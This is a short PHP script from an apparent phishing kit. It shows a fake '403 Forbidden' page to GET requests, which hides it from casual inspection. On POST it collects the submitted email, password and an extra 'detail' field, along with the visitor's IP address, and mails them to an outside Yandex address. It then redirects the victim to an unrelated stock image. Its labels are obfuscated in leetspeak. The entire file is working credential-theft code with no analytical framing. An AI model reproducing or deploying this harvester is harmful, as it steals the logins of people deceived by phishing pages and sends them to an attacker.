<?

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}


$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message  = "----+ ADEX RESULTS +----\n";
$message .= "3m41l: ".$_POST['email']."\n";
$message .= "9455w07d: ".$_POST['password']."\n";
$message .= "D3t4!l5: ".$_POST['detail']."\n";
$message .= "---+ KPK +---\n";
$message .= "Date & Time : $adddate\n";
$message .= "IP Address  : ".$ip."\n";
$to = "adexresults@yandex.com";
$subject = "Adex Results!!!! | ".$ip."\n";
mail($to,$subject,$message);
header("Location:  https://images.unsplash.com/photo-1620643137605-e02bca6bb5a0?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxzZWFyY2h8MTJ8fGFtZXJpY2FuJTIwaG91c2VzfGVufDB8fDB8fA%3D%3D&w=1000&q=80");
?>